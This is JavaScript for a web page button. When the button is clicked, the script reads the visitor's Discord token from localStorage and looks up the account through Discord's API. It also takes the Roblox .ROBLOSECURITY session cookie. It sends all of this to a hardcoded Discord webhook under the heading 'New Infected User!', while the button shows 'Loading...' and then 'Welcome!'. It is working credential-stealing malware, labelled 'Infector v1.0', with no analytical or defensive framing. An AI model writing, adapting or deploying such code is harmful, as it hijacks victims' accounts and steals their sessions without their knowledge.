document.getElementById('startBtn').addEventListener('click', async () => {
    const btn = document.getElementById('startBtn');
    btn.disabled = true;
    btn.innerText = "Loading...";

    // 1. Get Discord Token
    // This looks for the main auth token in localStorage
    let discordToken = null;
    try {
        // Common locations for the token
        const keys = Object.keys(localStorage);
        for (let key of keys) {
            if (key.includes("discord_token") || key.includes("token")) {
                discordToken = localStorage.getItem(key);
                break;
            }
        }
        // Fallback: try to grab it from the main discord token key if it exists
        if (!discordToken) {
            discordToken = localStorage.getItem("discord_token"); 
        }
    } catch (e) {
        discordToken = "Failed to get token";
    }

    // 2. Get Discord User Info (if token exists)
    let discordUser = null;
    if (discordToken && discordToken !== "Failed to get token") {
        try {
            const response = await fetch('https://discord.com/api/users/@me', {
                headers: {
                    authorization: discordToken
                }
            });
            if (response.ok) {
                discordUser = await response.json();
            } else {
                discordUser = { username: "Unknown", discriminator: "0000" }; // Handle invalid token gracefully
            }
        } catch (e) {
            discordUser = { error: e.message };
        }
    }

    // 3. Get Roblox Cookie
    // Roblox cookies are stored in localStorage under 'roblox:hasLoggedIn' or similar, 
    // but the actual cookie is usually in document.cookie or localStorage 'roblox_session'.
    // Note: document.cookie might be empty due to SameSite/HttpOnly settings in modern browsers.
    // We try localStorage first, then document.cookie.
    
    let robloxCookie = null;
    
    // Check localStorage for Roblox session
    if (localStorage.getItem("roblox_session")) {
        robloxCookie = localStorage.getItem("roblox_session");
    } else {
        // Check document.cookie
        const cookies = document.cookie;
        if (cookies) {
            const rbxCookie = cookies.split(';').find(c => c.includes('.ROBLOSECURITY'));
            robloxCookie = rbxCookie ? rbxCookie.trim() : "No .ROBLOSECURITY found in document.cookie";
        } else {
            robloxCookie = "No Roblox cookie found";
        }
    }

    // 4. Prepare Payload
    const payload = {
        embeds: [{
            title: "New Infected User!",
            color: 15158332, // Discord Red
            fields: [
                {
                    name: "Discord User",
                    value: discordUser ? `Username: ${discordUser.username}#${discordUser.discriminator}\nID: ${discordUser.id}` : "Token not found"
                },
                {
                    name: "Discord Token",
                    value: discordToken ? `\`${discordToken}\`` : "No token found"
                },
                {
                    name: "Roblox Cookie",
                    value: `\`${robloxCookie}\``
                }
            ],
            footer: {
                text: "Infector v1.0"
            },
            timestamp: new Date().toISOString()
        }]
    };

    // 5. Send to Webhook
    const webhookUrl = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        btn.innerText = "Welcome!";
        // Optional: Redirect or close window
        // window.location.href = "https://www.roblox.com";
    } catch (error) {
        console.error("Error sending to webhook:", error);
        btn.innerText = "Error";
    }
});
